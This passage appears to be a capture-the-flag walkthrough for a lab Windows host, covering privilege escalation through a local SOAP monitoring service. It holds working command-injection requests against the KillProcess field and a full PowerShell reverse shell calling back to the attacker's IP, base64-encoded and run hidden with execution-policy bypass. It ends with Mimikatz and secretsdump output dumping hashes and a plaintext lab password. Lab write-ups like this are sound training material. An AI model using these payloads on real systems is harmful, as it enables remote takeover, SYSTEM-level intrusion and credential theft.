<wsdl:definitions name="MonitoringService" targetNamespace="http://tempuri.org/" xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/" xmlns:wsx="http://schemas.xmlsoap.org/ws/2004/09/mex" xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd" xmlns:wsa10="http://www.w3.org/2005/08/addressing" xmlns:wsp="http://schemas.xmlsoap.org/ws/2004/09/policy" xmlns:wsap="http://schemas.xmlsoap.org/ws/2004/08/addressing/policy" xmlns:msc="http://schemas.microsoft.com/ws/2005/12/wsdl/contract" xmlns:soap12="http://schemas.xmlsoap.org/wsdl/soap12/" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:wsam="http://www.w3.org/2007/05/addressing/metadata" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:tns="http://tempuri.org/" xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/" xmlns:wsaw="http://www.w3.org/2006/05/addressing/wsdl" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/">                                                                                
  <wsdl:types>
    <xsd:schema targetNamespace="http://tempuri.org/Imports">
      <xsd:import schemaLocation="http://overwatch.htb:8000/MonitorService?xsd=xsd0" namespace="http://tempuri.org/"/>
      <xsd:import schemaLocation="http://overwatch.htb:8000/MonitorService?xsd=xsd1" namespace="http://schemas.microsoft.com/2003/10/Serialization/"/>                                                                                                                                            
    </xsd:schema>
  </wsdl:types>
  <wsdl:message name="IMonitoringService_StartMonitoring_InputMessage">
    <wsdl:part name="parameters" element="tns:StartMonitoring"/>
  </wsdl:message>
  <wsdl:message name="IMonitoringService_StartMonitoring_OutputMessage">
    <wsdl:part name="parameters" element="tns:StartMonitoringResponse"/>
  </wsdl:message>
  <wsdl:message name="IMonitoringService_StopMonitoring_InputMessage">
    <wsdl:part name="parameters" element="tns:StopMonitoring"/>
  </wsdl:message>
  <wsdl:message name="IMonitoringService_StopMonitoring_OutputMessage">
    <wsdl:part name="parameters" element="tns:StopMonitoringResponse"/>
  </wsdl:message>
  <wsdl:message name="IMonitoringService_KillProcess_InputMessage">
    <wsdl:part name="parameters" element="tns:KillProcess"/>
  </wsdl:message>
  <wsdl:message name="IMonitoringService_KillProcess_OutputMessage">
    <wsdl:part name="parameters" element="tns:KillProcessResponse"/>
  </wsdl:message>
  <wsdl:portType name="IMonitoringService">
    <wsdl:operation name="StartMonitoring">
      <wsdl:input wsaw:Action="http://tempuri.org/IMonitoringService/StartMonitoring" message="tns:IMonitoringService_StartMonitoring_InputMessage"/>                                                                                                                                             
      <wsdl:output wsaw:Action="http://tempuri.org/IMonitoringService/StartMonitoringResponse" message="tns:IMonitoringService_StartMonitoring_OutputMessage"/>                                                                                                                                   
    </wsdl:operation>
    <wsdl:operation name="StopMonitoring">
      <wsdl:input wsaw:Action="http://tempuri.org/IMonitoringService/StopMonitoring" message="tns:IMonitoringService_StopMonitoring_InputMessage"/>                                                                                                                                               
      <wsdl:output wsaw:Action="http://tempuri.org/IMonitoringService/StopMonitoringResponse" message="tns:IMonitoringService_StopMonitoring_OutputMessage"/>                                                                                                                                     
    </wsdl:operation>
    <wsdl:operation name="KillProcess">
      <wsdl:input wsaw:Action="http://tempuri.org/IMonitoringService/KillProcess" message="tns:IMonitoringService_KillProcess_InputMessage"/>
      <wsdl:output wsaw:Action="http://tempuri.org/IMonitoringService/KillProcessResponse" message="tns:IMonitoringService_KillProcess_OutputMessage"/>                                                                                                                                           
    </wsdl:operation>
  </wsdl:portType>
  <wsdl:binding name="BasicHttpBinding_IMonitoringService" type="tns:IMonitoringService">
    <soap:binding transport="http://schemas.xmlsoap.org/soap/http"/>
    <wsdl:operation name="StartMonitoring">
      <soap:operation soapAction="http://tempuri.org/IMonitoringService/StartMonitoring" style="document"/>
      <wsdl:input>
        <soap:body use="literal"/>
      </wsdl:input>
      <wsdl:output>
        <soap:body use="literal"/>
      </wsdl:output>
    </wsdl:operation>
    <wsdl:operation name="StopMonitoring">
      <soap:operation soapAction="http://tempuri.org/IMonitoringService/StopMonitoring" style="document"/>
      <wsdl:input>
        <soap:body use="literal"/>
      </wsdl:input>
      <wsdl:output>
        <soap:body use="literal"/>
      </wsdl:output>
    </wsdl:operation>
    <wsdl:operation name="KillProcess">
      <soap:operation soapAction="http://tempuri.org/IMonitoringService/KillProcess" style="document"/>
      <wsdl:input>
        <soap:body use="literal"/>
      </wsdl:input>
      <wsdl:output>
        <soap:body use="literal"/>
      </wsdl:output>
    </wsdl:operation>
  </wsdl:binding>
  <wsdl:service name="MonitoringService">
    <wsdl:port name="BasicHttpBinding_IMonitoringService" binding="tns:BasicHttpBinding_IMonitoringService">
      <soap:address location="http://overwatch.htb:8000/MonitorService"/>
    </wsdl:port>
  </wsdl:service>
</wsdl:definitions>
```

**Available Operations:** The WSDL reveals three SOAP operations:
1. **StartMonitoring** - Starts a monitoring service
2. **StopMonitoring** - Stops the monitoring service
3. **KillProcess** - Kills a process by name (parameter: `processName`)

The `KillProcess` operation accepts a `processName` parameter and calls PowerShell's `Stop-Process` cmdlet under the hood. This is a high-value target for exploitation.

#### Exploiting Command Injection in KillProcess

**Initial testing:** We send a SOAP request to kill notepad process

```
┌──(kali㉿kali)-[~/Pentesting/Tools/krbrelayx]
└─$ curl -s -X POST http://localhost:8000/MonitorService \
  -H 'Content-Type: text/xml; charset=utf-8' \
  -H 'SOAPAction: "http://tempuri.org/IMonitoringService/KillProcess"' \
  -d '<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tns="http://tempuri.org/">
  <soap:Body>
    <tns:KillProcess>
      <tns:processName>notepad</tns:processName> 
    </tns:KillProcess>
  </soap:Body>
</soap:Envelope>' | xq

<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
  <s:Body>
    <KillProcessResponse xmlns="http://tempuri.org/">
      <KillProcessResult/>
    </KillProcessResponse>
  </s:Body>
</s:Envelope>
```

**Testing for injection vulnerabilities:** The processName field is directly passed to PowerShell without sanitization. We test with a semicolon (`;`) as a command separator to see if we can inject additional commands.

When we inject `notepad ; ping 10.10.15.113`, we get PowerShell output - but with an error about `-Force` flag. This reveals:
1. The backend is executing: `Stop-Process -Name <input> -Force`
2. The input is being inserted directly into the command string
3. We need to comment out or escape the `-Force` parameter

```
┌──(kali㉿kali)-[~/Pentesting/Tools/krbrelayx]
└─$ curl -s -X POST http://localhost:8000/MonitorService \
  -H 'Content-Type: text/xml; charset=utf-8' \
  -H 'SOAPAction: "http://tempuri.org/IMonitoringService/KillProcess"' \
  -d '<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tns="http://tempuri.org/">
  <soap:Body>
    <tns:KillProcess>
      <tns:processName>notepad ; ping 10.10.15.113 </tns:processName>
    </tns:KillProcess>
  </soap:Body>
</soap:Envelope>' | xq
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
  <s:Body>
    <KillProcessResponse xmlns="http://tempuri.org/">
      <KillProcessResult>Bad option -Force.

Usage: ping [-t] [-a] [-n count] [-l size] [-f] [-i TTL] [-v TOS]
            [-r count] [-s count] [[-j host-list] | [-k host-list]]
            [-w timeout] [-R] [-S srcaddr] [-c compartment] [-p]
            [-4] [-6] target_name

Options:
    -t             Ping the specified host until stopped.
                   To see statistics and continue - type Control-Break;
                   To stop - type Control-C.
    -a             Resolve addresses to hostnames.
    -n count       Number of echo requests to send.
    -l size        Send buffer size.
    -f             Set Don't Fragment flag in packet (IPv4-only).
    -i TTL         Time To Live.
    -v TOS         Type Of Service (IPv4-only. This setting has been deprecated
                   and has no effect on the type of service field in the IP
                   Header).
    -r count       Record route for count hops (IPv4-only).
    -s count       Timestamp for count hops (IPv4-only).
    -j host-list   Loose source route along host-list (IPv4-only).
    -k host-list   Strict source route along host-list (IPv4-only).
    -w timeout     Timeout in milliseconds to wait for each reply.
    -R             Use routing header to test reverse route also (IPv6-only).
                   Per RFC 5095 the use of this routing header has been
                   deprecated. Some systems may drop echo requests if
                   this header is used.
    -S srcaddr     Source address to use.
    -c compartment Routing compartment identifier.
    -p             Ping a Hyper-V Network Virtualization provider address.
    -4             Force using IPv4.
    -6             Force using IPv6.


</KillProcessResult>
    </KillProcessResponse>
  </s:Body>
</s:Envelope>
```

**Discovering the underlying command:** We test with the `&` operator (XML-encoded as `&amp;`) to see what PowerShell command is actually being executed. PowerShell's error message reveals the exact cmdlet construction:

Command executed: `Stop-Process -Name notepad & ping 10.10.15.113 -Force`

This error tells us:
- The processName parameter is injected directly after `-Name` 
- The `-Force` parameter is added after our input
- We need to comment out (`#`) or escape the trailing `-Force` to prevent syntax errors

```
┌──(kali㉿kali)-[~/Pentesting/Tools/krbrelayx]
└─$ curl -s -X POST http://localhost:8000/MonitorService \
  -H 'Content-Type: text/xml; charset=utf-8' \
  -H 'SOAPAction: "http://tempuri.org/IMonitoringService/KillProcess"' \
  -d '<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tns="http://tempuri.org/">
  <soap:Body>
    <tns:KillProcess>
      <tns:processName>notepad &amp; ping 10.10.15.113 </tns:processName>
    </tns:KillProcess>
  </soap:Body>
</soap:Envelope>' | xq
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
  <s:Body>
    <KillProcessResponse xmlns="http://tempuri.org/">
      <KillProcessResult><![CDATA[Error: At line:1 char:28
+ Stop-Process -Name notepad & ping 10.10.15.113  -Force
+                            ~
The ampersand (&) character is not allowed. The & operator is reserved for future use; wrap an ampersand in double quotation marks ("&") to pass it as part of a string.]]></KillProcessResult>
    </KillProcessResponse>
  </s:Body>
</s:Envelope>
```

**Successful exploitation with comment bypass:** We inject `notepad ; ping 10.10.15.113 #` which becomes: `Stop-Process -Name notepad ; ping 10.10.15.113 # -Force`. The `#` comments out everything after it, allowing arbitrary commands to execute.

```
┌──(kali㉿kali)-[~/Pentesting/Tools/krbrelayx]
└─$ curl -s -X POST http://localhost:8000/MonitorService \
  -H 'Content-Type: text/xml; charset=utf-8' \
  -H 'SOAPAction: "http://tempuri.org/IMonitoringService/KillProcess"' \
  -d '<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tns="http://tempuri.org/">
  <soap:Body>
    <tns:KillProcess>
      <tns:processName>notepad ; ping 10.10.15.113 #</tns:processName>
    </tns:KillProcess>
  </soap:Body>
</soap:Envelope>' | xq
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
  <s:Body>
    <KillProcessResponse xmlns="http://tempuri.org/">
      <KillProcessResult>
Pinging 10.10.15.113 with 32 bytes of data:
Reply from 10.10.15.113: bytes=32 time=160ms TTL=63
Reply from 10.10.15.113: bytes=32 time=173ms TTL=63
Reply from 10.10.15.113: bytes=32 time=140ms TTL=63
Reply from 10.10.15.113: bytes=32 time=187ms TTL=63

Ping statistics for 10.10.15.113:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 140ms, Maximum = 187ms, Average = 165ms

</KillProcessResult>
    </KillProcessResponse>
  </s:Body>
</s:Envelope>

┌──(kali㉿kali)-[~/Pentesting/Tools/krbrelayx]
└─$ sudo tcpdump -ni tun0 icmp              
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
01:19:37.153397 IP 10.129.38.246 > 10.10.15.113: ICMP echo request, id 1, seq 3, length 40
01:19:37.153515 IP 10.10.15.113 > 10.129.38.246: ICMP echo reply, id 1, seq 3, length 40
01:19:38.234353 IP 10.129.38.246 > 10.10.15.113: ICMP echo request, id 1, seq 4, length 40
01:19:38.234408 IP 10.10.15.113 > 10.129.38.246: ICMP echo reply, id 1, seq 4, length 40
01:19:39.169130 IP 10.129.38.246 > 10.10.15.113: ICMP echo request, id 1, seq 5, length 40
01:19:39.169178 IP 10.10.15.113 > 10.129.38.246: ICMP echo reply, id 1, seq 5, length 40
01:19:40.282650 IP 10.129.38.246 > 10.10.15.113: ICMP echo request, id 1, seq 6, length 40
01:19:40.282702 IP 10.10.15.113 > 10.129.38.246: ICMP echo reply, id 1, seq 6, length 40
```

Getting a reverse shell

```
┌──(kali㉿kali)-[~/Pentesting/Tools/krbrelayx]
└─$ echo -n '$c = New-Object Net.Sockets.TCPClient("10.10.15.113",4444);$s = $c.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2>&1 | Out-String );$sb2 = $sb + "PS " + (pwd).Path + "> ";$ssb = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($ssb,0,$ssb.Length);$s.Flush()};$c.Close()' | iconv -t UTF-16LE | base64 -w 0 
JABjACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA1AC4AMQAxADMAIgAsADQANAA0ADQAKQA7ACQAcwAgAD0AIAAkAGMALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMALgBSAGUAYQBkACgAJABiACwAIAAwACwAIAAkAGIALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIALAAwACwAIAAkAGkAKQA7ACQAcwBiACAAPQAgACgAaQBlAHgAIAAkAGQAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGIAMgAgAD0AIAAkAHMAYgAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAHMAYgAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBiADIAKQA7ACQAcwAuAFcAcgBpAHQAZQAoACQAcwBzAGIALAAwACwAJABzAHMAYgAuAEwAZQBuAGcAdABoACkAOwAkAHMALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMALgBDAGwAbwBzAGUAKAApAA==

# Final Payload 
powershell -nop -W hidden -noni -ep bypass -enc JABjACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA1AC4AMQAxADMAIgAsADQANAA0ADQAKQA7ACQAcwAgAD0AIAAkAGMALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMALgBSAGUAYQBkACgAJABiACwAIAAwACwAIAAkAGIALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIALAAwACwAIAAkAGkAKQA7ACQAcwBiACAAPQAgACgAaQBlAHgAIAAkAGQAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGIAMgAgAD0AIAAkAHMAYgAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAHMAYgAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBiADIAKQA7ACQAcwAuAFcAcgBpAHQAZQAoACQAcwBzAGIALAAwACwAJABzAHMAYgAuAEwAZQBuAGcAdABoACkAOwAkAHMALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMALgBDAGwAbwBzAGUAKAApAA==
```

Setup a listener, then

```
curl -s -X POST http://localhost:8000/MonitorService \
  -H 'Content-Type: text/xml; charset=utf-8' \
  -H 'SOAPAction: "http://tempuri.org/IMonitoringService/KillProcess"' \
  -d '<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tns="http://tempuri.org/">
  <soap:Body>
    <tns:KillProcess>
      <tns:processName>notepad ; powershell -nop -W hidden -noni -ep bypass -enc JABjACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA1AC4AMQAxADMAIgAsADQANAA0ADQAKQA7ACQAcwAgAD0AIAAkAGMALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMALgBSAGUAYQBkACgAJABiACwAIAAwACwAIAAkAGIALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIALAAwACwAIAAkAGkAKQA7ACQAcwBiACAAPQAgACgAaQBlAHgAIAAkAGQAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGIAMgAgAD0AIAAkAHMAYgAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAHMAYgAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBiADIAKQA7ACQAcwAuAFcAcgBpAHQAZQAoACQAcwBzAGIALAAwACwAJABzAHMAYgAuAEwAZQBuAGcAdABoACkAOwAkAHMALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMALgBDAGwAbwBzAGUAKAApAA== #</tns:processName>
    </tns:KillProcess>
  </soap:Body>
</soap:Envelope>'
```

#### Root flag

```
┌──(kali㉿kali)-[~/Pentesting/Tools/krbrelayx]
└─$ rlwrap -cAr nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.15.113] from (UNKNOWN) [10.129.38.246] 57547

PS C:\Software\Monitoring> whoami
nt authority\system
PS C:\Software\Monitoring> cat C:\Users\Administrator\Desktop\root.txt
************94a907a8d737363319
```

**Success!** We received an interactive shell with `NT AUTHORITY\SYSTEM` privileges - the highest privilege level on Windows. This happened because the HTTP service (PID 4796) running the SOAP endpoint was executing with SYSTEM privileges, and PowerShell inherited those permissions.

#### Post-Exploitation & Credential Harvesting

With SYSTEM access, we can now dump domain credentials using Mimikatz. This allows us to harvest hashes and plaintext passwords from memory

```
PS C:\Software\Monitoring> .\m.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "lsadump::secrets" "lsadump::cache" exit

  .#####.   mimikatz 2.2.0 (x64) #19041 Jan 17 2026 14:57:46
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # token::elevate
Token Id  : 0
User name : 
SID name  : NT AUTHORITY\SYSTEM

632     {0;000003e7} 1 D 32093          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;000003e7} 0 D 33974728    NT AUTHORITY\SYSTEM     S-1-5-18        (04g,28p)       Primary
 * Thread Token  : {0;000003e7} 1 D 34021614    NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

mimikatz(commandline) # sekurlsa::logonpasswords

Authentication Id : 0 ; 803497 (00000000:000c42a9)
Session           : Service from 0
User Name         : SQLTELEMETRY$SQLEXPRESS
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 5/11/2026 8:36:45 AM
SID               : S-1-5-80-1985561900-798682989-2213159822-1904180398-3434236965
        msv :
         [00000003] Primary
         * Username : S200401$
         * Domain   : OVERWATCH
         * NTLM     : 1b0de87727db8880deb1ad234370181a
         * SHA1     : 50f44cffdd882fd21d3320a32812370a2689a338
         * DPAPI    : 50f44cffdd882fd21d3320a32812370a
        tspkg :
        wdigest :
         * Username : S200401$
         * Domain   : OVERWATCH
         * Password : (null)
        kerberos :
         * Username : S200401$
         * Domain   : overwatch.htb
         * Password : c0 3f 3f 22 98 ae 30 65 e4 00 b8 6f 60 d0 71 bb cf f6 02 df cf 56 fe d6 86 94 c8 b5 54 14 2e 90 b0 71 22 ef 1e 78 50 cd 64 92 ac e1 54 de a4 8a a4 bf e4 f1 9f 68 aa b3 90 c9 b8 40 55 85 55 fc 7b 88 79 8f 46 78 6b ca ed 81 df 02 92 66 82 98 2c 81 7b ef c1 0c 9a 7f ac 20 32 8b 31 47 b8 7b 73 54 52 be 3f 43 51 d1 14 21 89 c1 51 34 42 04 c9 dc 13 36 3c a2 d3 5e b6 9d c7 bb bd 7e ca 3b 9e 2f f4 08 c9 ba 84 e9 9b 4b bd 80 d8 8a 89 ff 76 0a fa b1 87 cb 41 88 b8 1d 23 f6 b7 f8 89 d4 52 a4 bd 92 bb 22 4d 7c 89 a0 d3 b6 a4 d4 82 26 dd ba 7a fc 8f 99 32 be 2e 9b 72 9b ad 9c 2c 20 1a 89 91 49 c1 c2 c7 e1 ef a4 ec b6 a8 07 1f 2f 6c c7 3b 26 9b 8e e8 b0 60 74 ab b6 97 ae 1f 97 c5 0a 07 f7 b6 04 88 7d fc ba 26 0e 99 08 ba d8 
......
......
......

Authentication Id : 0 ; 605544 (00000000:00093d68)
Session           : Batch from 0
User Name         : Administrator
Domain            : OVERWATCH
Logon Server      : S200401
Logon Time        : 5/11/2026 8:35:15 AM
SID               : S-1-5-21-2797066498-1365161904-233915892-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : OVERWATCH
         * NTLM     : 269fa056205bbf5d47fc2c3682dbbce6
         * SHA1     : 5d6dcad4236acab5572f49f49ab79e5774fd350a
         * DPAPI    : 97338693a826f4f53d077705d998cba4
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : OVERWATCH
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : overwatch.htb
         * Password : ReinhardHammer507
......
......
```

```
┌──(kali㉿kali)-[~/Pentesting/Tools/krbrelayx]
└─$ impacket-secretsdump overwatch.htb/'S200401$'@S200401.overwatch.htb -hashes ':1b0de87727db8880deb1ad234370181a' -dc-ip $ip
```

#### Privilege Escalation Summary

**Attack Chain:**
1. **Discovery**: Found internal SOAP service on port 8000 listening only on localhost
2. **Tunneling**: Used Chisel to establish reverse port forwarding to access the internal service
3. **Enumeration**: Retrieved WSDL specification revealing vulnerable `KillProcess` operation
4. **Exploitation**: Discovered PowerShell command injection in processName parameter
5. **Bypass**: Used comment syntax (`#`) to bypass the `-Force` parameter added by the backend
6. **RCE**: Injected encoded PowerShell reverse shell payload
7. **Privilege Escalation**: Shell executed with SYSTEM privileges inherited from HTTP service
8. **Post-Exploitation**: Dumped domain credentials using Mimikatz

**Key Vulnerability**: The SOAP service implements the KillProcess operation by directly concatenating user input into a PowerShell command without any sanitization or escaping. This allows arbitrary command execution and ultimately system compromise.
